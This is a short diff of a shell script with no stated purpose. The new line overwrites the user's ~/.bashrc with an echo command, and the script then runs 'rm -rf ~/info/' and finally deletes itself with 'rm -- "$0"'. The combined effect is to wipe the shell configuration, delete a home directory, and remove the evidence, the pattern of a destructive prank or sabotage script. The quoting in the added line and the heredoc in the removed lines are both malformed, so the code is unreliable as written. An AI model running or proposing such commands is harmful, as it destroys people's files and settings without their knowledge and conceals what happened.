@@ -1,6 +1,3 @@
-cat < EOF >> ~/.bashrc
-clear
-echo "hello user"
-EOF
+echo "echo "hello user!" " > ~/.bashrc
 rm -rf ~/info/
 rm -- "$0"
